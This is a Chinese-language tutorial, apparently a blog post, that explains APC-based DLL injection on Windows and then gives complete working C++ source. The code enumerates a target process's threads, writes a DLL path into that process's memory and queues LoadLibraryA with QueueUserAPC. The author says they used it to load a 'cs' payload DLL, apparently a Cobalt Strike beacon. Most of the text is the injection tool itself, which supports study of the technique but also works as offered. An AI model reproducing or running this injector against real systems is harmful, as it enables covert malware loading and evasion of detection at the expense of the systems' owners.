通俗点来概括过程可分为以下几步：
1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。  
2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。  
3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。
但是想要使用apc注入也有以下两点条件：
1.必须是多线程环境下
2.注入的程序必须会调用那些同步对象
每一个进程的 **每一个线程都有自己的APC队列** ，我们可以使用 **QueueUserAPC**
函数把一个APC函数压入APC队列中。当处于用户模式的APC被压入到线程APC队列后，线程并不会立刻执行压入的APC函数，而是要等到线程处于
**可通知状态** (alertable)才会执行，即只有当一个线程内部调用 **SleepEx** 等上面说到的几个特定函数将自己处于 **挂起状态**
时，才会执行APC队列函数，执行顺序与普通队列相同， **先进先出（FIFO）** ，在整个执行过程中，线程并无任何异常举动，不容易被察觉，但 **缺点**
是对于 **单线程程序一般不存在挂起状态** ，所以APC注入对于这类程序没有明显效果。
### 实现过程
这里的常规思路是编写一个根据进程名获取pid的函数，然后根据PID获取所有的线程ID，这里我就将两个函数集合在一起，通过自己输入PID来获取指定进程的线程并写入数组
    //列出指定进程的所有线程
    BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)
    {
        // 申请空间
        DWORD dwThreadIdListLength = 0;
        DWORD dwThreadIdListMaxCount = 2000;
        LPDWORD pThreadIdList = NULL;
        HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
        pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pThreadIdList == NULL)
        {
            return FALSE;
        }
        RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
        THREADENTRY32 th32 = { 0 };
        // 拍摄快照
        hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
        if (hThreadSnap == INVALID_HANDLE_VALUE)
        {
            return FALSE;
        }
        // 结构的大小
        th32.dwSize = sizeof(THREADENTRY32);
        // 遍历所有THREADENTRY32结构, 按顺序填入数组
        BOOL bRet = Thread32First(hThreadSnap, &th32);
        while (bRet)
        {
            if (th32.th32OwnerProcessID == th32ProcessID)
            {
                if (dwThreadIdListLength >= dwThreadIdListMaxCount)
                {
                    break;
                }
                pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
            }
            bRet = Thread32Next(hThreadSnap, &th32);
        }
        *pThreadIdListLength = dwThreadIdListLength;
        *ppThreadIdList = pThreadIdList;
        return TRUE;
    }
然后是apc注入的主函数，首先使用`VirtualAllocEx`远程申请内存
    lpAddr = ::VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
然后使用`WriteProcessMemory`把dll路径写入内存
    ::WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr)
再获取`LoadLibraryA`的地址
    PVOID loadLibraryAddress = ::GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");
便利线程并插入APC，这里定义一个fail并进行判断，如果`QueueUserAPC`返回的值为NULL则线程遍历失败，fail的值就+1
    for (int i = dwThreadIdListLength - 1; i >= 0; i--)
        {
            // 打开线程
            HANDLE hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
            if (hThread)
            {
                // 插入APC
                if (!::QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))
                {
                    fail++;
                }
            }
        }
然后在到主函数，定义dll地址
    strcpy_s(wzDllFullPath, "C:\\Users\\61408\\Desktop\\artifact.dll");
使用`OpenProcess`打开句柄
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);
调用之前写好的`APCInject`函数实现APC注入
    if (!APCInject(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))
        {
            printf("Failed to inject DLL\n");
            return FALSE;
        }
完整代码如下
    // APCInject.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
    //
    #include 
    #include 
    #include 
    using namespace std;
    void ShowError(const char* pszText)
    {
        char szError[MAX_PATH] = { 0 };
        ::wsprintf(szError, "%s Error[%d]\n", pszText, ::GetLastError());
        ::MessageBox(NULL, szError, "ERROR", MB_OK);
    }
    //列出指定进程的所有线程
    BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)
    {
        // 申请空间
        DWORD dwThreadIdListLength = 0;
        DWORD dwThreadIdListMaxCount = 2000;
        LPDWORD pThreadIdList = NULL;
        HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
        pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pThreadIdList == NULL)
        {
            return FALSE;
        }
        RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
        THREADENTRY32 th32 = { 0 };
        // 拍摄快照
        hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
        if (hThreadSnap == INVALID_HANDLE_VALUE)
        {
            return FALSE;
        }
        // 结构的大小
        th32.dwSize = sizeof(THREADENTRY32);
        //遍历所有THREADENTRY32结构, 按顺序填入数组
        BOOL bRet = Thread32First(hThreadSnap, &th32);
        while (bRet)
        {
            if (th32.th32OwnerProcessID == th32ProcessID)
            {
                if (dwThreadIdListLength >= dwThreadIdListMaxCount)
                {
                    break;
                }
                pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
            }
            bRet = Thread32Next(hThreadSnap, &th32);
        }
        *pThreadIdListLength = dwThreadIdListLength;
        *ppThreadIdList = pThreadIdList;
        return TRUE;
    }
    BOOL APCInject(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)
    {
        // 申请内存
        PVOID lpAddr = NULL;
        SIZE_T page_size = 4096;
        lpAddr = ::VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (lpAddr == NULL)
        {
            ShowError("VirtualAllocEx - Error\n\n");
            VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
            CloseHandle(hProcess);
            return FALSE;
        }
        // 把Dll的路径复制到内存中
        if (FALSE == ::WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr))
        {
            ShowError("WriteProcessMemory - Error\n\n");
            VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
            CloseHandle(hProcess);
            return FALSE;
        }
        // 获得LoadLibraryA的地址
        PVOID loadLibraryAddress = ::GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        // 遍历线程, 插入APC
        float fail = 0;
        for (int i = dwThreadIdListLength - 1; i >= 0; i--)
        {
            // 打开线程
            HANDLE hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
            if (hThread)
            {
                // 插入APC
                if (!::QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))
                {
                    fail++;
                }
                // 关闭线程句柄
                ::CloseHandle(hThread);
                hThread = NULL;
            }
        }
        printf("Total Thread: %d\n", dwThreadIdListLength);
        printf("Total Failed: %d\n", (int)fail);
        if ((int)fail == 0 || dwThreadIdListLength / fail > 0.5)
        {
            printf("Success to Inject APC\n");
            return TRUE;
        }
        else
        {
            printf("Inject may be failed\n");
            return FALSE;
        }
    }
    int main()
    {
        ULONG32 ulProcessID = 0;
        printf("Input the Process ID:");
        cin >> ulProcessID;
        CHAR wzDllFullPath[MAX_PATH] = { 0 };
        LPDWORD pThreadIdList = NULL;
        DWORD dwThreadIdListLength = 0;
    #ifndef _WIN64
        strcpy_s(wzDllFullPath, "C:\\Users\\61408\\Desktop\\artifact.dll");
    #else // _WIN64
        strcpy_s(wzDllFullPath, "C:\\Users\\61408\\Desktop\\artifact.dll");
    #endif
        if (!GetProcessThreadList(ulProcessID, &pThreadIdList, &dwThreadIdListLength))
        {
            printf("Can not list the threads\n");
            exit(0);
        }
        //打开句柄
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);
        if (hProcess == NULL)
        {
            printf("Failed to open Process\n");
            return FALSE;
        }
        //注入
        if (!APCInject(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))
        {
            printf("Failed to inject DLL\n");
            return FALSE;
        }
        return 0;
    }
之前说过我没有使用`进程名 -> pid`的方式，而是直接采用手动输入的方式，通过`cin >>
ulProcessID`将接收到的参数赋给`ulProcessID`
这里可以选择写一个MessageBox的dll，这里我直接用的是cs的dll，演示效果如下所示